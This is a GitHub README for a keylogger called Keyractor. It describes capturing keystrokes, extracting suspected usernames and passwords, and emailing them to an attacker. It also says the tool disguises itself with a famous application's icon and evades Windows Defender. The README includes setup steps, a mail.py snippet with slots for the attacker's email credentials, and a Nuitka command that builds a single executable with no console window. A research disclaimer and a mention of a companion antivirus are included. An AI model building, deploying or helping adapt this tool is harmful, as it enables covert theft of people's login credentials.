
  <h3 align="center"> Keyractor </h3>

  <p align="center">
Keyractor that is keylogging application that can detect user input and extract suspected username and password and sent it by email to the attacker, the app run in the background and has the icon of famous application so the normal user cannot distinguish it from the original one.
  </p>
</p>


<div align="center">

[![GitHub issues](https://img.shields.io/github/contributors/AhmedZahran02/Keyractor)](https://github.com/AhmedZahran02/Keyractor/contributors)
[![GitHub issues](https://img.shields.io/github/issues/AhmedZahran02/Keyractor)](https://github.com/AhmedZahran02/Keyractor/issues)
[![GitHub forks](https://img.shields.io/github/forks/AhmedZahran02/Keyractor)](https://github.com/AhmedZahran02/Keyractor/network)
[![GitHub stars](https://img.shields.io/github/stars/AhmedZahran02/Keyractor)](https://github.com/AhmedZahran02/Keyractor/stargazers)
[![GitHub license](https://img.shields.io/github/license/AhmedZahran02/Keyractor)](https://github.com/AhmedZahran02/Keyractor/blob/main/LICENSE)

</div>

## Ethical warning

- This app is made for research purposes and we aren't responsible for any illegal usage
- The app bypass windows defender antivirus so we developed an antivirus for the app that can be found in /antivirus/antivirus.py

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Installation

  <h4>Dependencies</h4>
  - python 3.6 or higher 
  
<h4> :package: Libraries </h4>
  - pynput
  <br/>
  <br/>
  - pyperclip
  <br/>
  <br/>
  can be installed using 
  <br/>
  
  ```
      pip install [pakage-name] 
  ```

<br/>

```
$ git clone https://github.com/AhmedZahran02/Keyractor.git
$ cd Keyractor
```

## Usage
  you need to insert an auxiliary email that will send the data and an attacker email that the data will be sent to
  <br/>
  ```mail.py
    def send_file(path):
    sender_email = ''        # aux email address
    sender_password = ''     # aux email password

    receiver_email = ''  # attacker email address
    subject = 'Target hecked successfully'
    message = "I'm a genius hecker."
    attachment_path = path     # path to key log file
  ```

## Deployment

- you need to install nutika from https://www.nuitka.net/
  <br/>
- run this command in the project directory
  
  <br/>
  
```nuitika deployment
    python -m nuitka --mingw64 .\Keyractor.py --standalone --onefile --windows-disable-console
  ```

## Contact
  - Email: aozaoz2017@gmail.com
    <br/>
  - GitHub: AhmedZahran02
    <br/>
# :copyright: Developers

<table>
  <tr>
    <td align="center">
    <a href="https://github.com/AhmedZahran02" target="_black">
    <img src="https://github.com/AhmedZahran02.png" width="150px;" alt="Ahmed Abdelatty"/>
    <br />
    <sub><b>Ahmed Zahran</b></sub></a>
    </td>
    <td align="center">
    <a href="https://github.com/MoAdelEzz" target="_black">
    <img src="https://github.com/MoAdelEzz.png" width="150px;" alt="MoAdelEzz"/>
    <br />
    <sub><b>Mohamed Adel</b></sub></a>
    </td>
    <td align="center">
    <a href="https://github.com/Youssef-Hagag" target="_black">
    <img src="https://github.com/Youssef-Hagag.png" width="150px;" alt="Youssef Hagag"/>
    <br />
    <sub><b>Youssef Hagag</b></sub></a>
    </td>
    <td align="center">
    <a href="https://github.com/AbdoWise-z" target="_black">
    <img src="https://github.com/AbdoWise-z.png" width="150px;" alt="AbdoWise-z"/>
    <br />
    <sub><b>Abd Elrahman Mohamed</b></sub></a>
    </td>
    </td>
    </tr>
 </table>
